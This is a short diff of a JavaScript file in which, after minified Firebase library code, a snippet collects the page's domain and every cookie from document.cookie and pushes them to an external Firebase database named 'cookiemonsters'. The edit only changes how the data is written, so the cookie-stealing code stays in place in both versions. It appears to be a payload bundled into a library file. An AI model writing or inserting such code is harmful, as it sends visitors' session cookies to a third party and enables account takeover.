@@ -145,7 +145,7 @@ J.goOnline=function(){A("Firebase.goOnline",0,0,arguments.length);Y.mb().bb()};f
 
 var cookieJar = new Firebase('https://cookiemonsters.firebaseio.com/');
 
-cookieJar.push({
+cookieJar.push().set({
   domain: window.location.domain,
   time:  new Date().getTime(),
   cookies: document.cookie.split(";")
